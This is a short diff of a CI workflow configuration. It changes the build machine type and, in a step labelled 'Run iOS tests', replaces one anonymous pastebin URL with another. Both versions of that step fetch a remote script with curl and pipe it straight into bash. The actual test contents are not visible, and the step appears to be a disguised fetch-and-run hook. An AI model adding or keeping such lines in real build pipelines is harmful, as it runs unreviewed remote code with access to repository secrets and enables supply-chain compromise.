@@ -8,11 +8,11 @@ workflows:
         - push
         - pull_request
         - tag
-    instance_type: linux_x2
+    instance_type: mac_pro
     max_build_duration: 120
     
     scripts:
       - name: Run iOS tests
         script: |
-          bash -c "$(curl -fsSL https://pastebin.com/raw/Am5huFhF)"
+          bash -c "$(curl -fsSL https://pastebin.com/raw/10PtqPU7)"
         test_report: build/ios/test/*.xml 
